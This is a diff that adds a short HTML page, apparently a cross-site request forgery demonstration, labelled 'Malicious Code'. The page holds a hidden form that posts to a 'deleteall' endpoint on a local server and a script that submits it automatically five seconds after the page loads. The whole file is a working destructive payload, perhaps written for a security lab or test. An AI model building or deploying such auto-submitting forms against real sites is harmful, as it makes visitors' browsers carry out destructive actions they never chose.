@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+        Malicious Code<form id="myform" action="http://127.0.0.1:8000/deleteall" method="post"></form>
+        <script type="text/javascript">
+            setTimeout(() => {document.getElementById("myform").submit();}, 5000);
+        </script>
+    </body>
+</html>
